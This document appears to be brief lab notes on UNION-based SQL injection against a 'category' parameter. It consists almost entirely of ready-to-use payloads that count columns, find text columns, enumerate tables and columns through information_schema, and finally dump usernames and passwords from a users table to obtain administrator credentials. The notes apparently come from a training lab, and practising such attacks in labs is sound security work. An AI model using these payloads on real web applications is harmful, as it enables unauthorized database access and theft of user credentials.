#determine number of col
category=Pets' ORDER BY 2--

#determine which col contain text data
category=Pets' UNION SELECT null,'B' --

#retrieve the list of tables in the DB
category=Pets' UNION SELECT null,table_name||'~'||table_type FROM information_schema.tables --

#find the name of the table with credentials (view VS base table)

#list column names from table users
category=Pets' UNION SELECT null,column_name||'~'||data_type FROM information_schema.columns WHERE table_name='users' --

#find the name of the columns for username,password

#list users(username,password) from table users
category=Pets' UNION SELECT null,username||'~'||password FROM users --

#find the administrator credentials



